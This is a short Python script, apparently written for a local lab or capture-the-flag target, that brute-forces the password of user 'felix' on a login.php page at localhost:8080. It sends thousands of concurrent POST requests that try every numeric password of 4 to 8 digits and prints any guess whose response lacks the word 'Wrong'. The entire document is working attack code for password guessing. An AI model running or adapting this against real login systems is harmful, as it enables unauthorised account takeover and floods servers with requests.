#TODO add async! 
import random
import string
import requests
import time
import asyncio
from aiohttp import ClientSession


async def brute(passwd, session, start_time):
    creds = {'user' : 'felix', 'password' : passwd}
    async with session.post('http://localhost:8080/login.php', data=creds) as response:
        # s = response.read
        # print(s)
        # html_text = await response.read()
        html_text = await response.text()
        if 'Wrong' not in html_text:
           print("[{}]YAY! pass: {}".format(time.time() - start_time, passwd))


async def bound_fetch(semaph, password, session, start_time):
    async with semaph:
        await brute(password, session, start_time)

loops = asyncio.get_event_loop()
tasks = []

async def run():
    digits = {
        1000: 9999,
        10000: 99999,
        100000: 999999,
        1000000: 9999999,
        10000000: 99999999
    }
    tasks = []
    semaph = asyncio.Semaphore(5000)    #CHANGE 1000 IF SMTH FAILS
    async with ClientSession() as sess:
        for low, high in digits.items():
            start_time = time.time()
            for i in range(low, high + 1):
                if i % 1000 == 0:
                    time.sleep(0.5)
                task = asyncio.ensure_future(bound_fetch(semaph, str(i), sess, start_time))
                tasks.append(task)
                # html = await brute(str(i), sess)
                # print(html)
            responses = asyncio.gather(*tasks)
            await responses
            #     brute(str(i), )
            #     if 'Wrong' in req.text:
            #         continue
            #     else:
            #         print("password: {0} time: {1}".format(passwd, time.time() - start))
            #     print("yay! Password: ", passwd)

loop = asyncio.get_event_loop()

future = asyncio.ensure_future(run())
loop.run_until_complete(future)

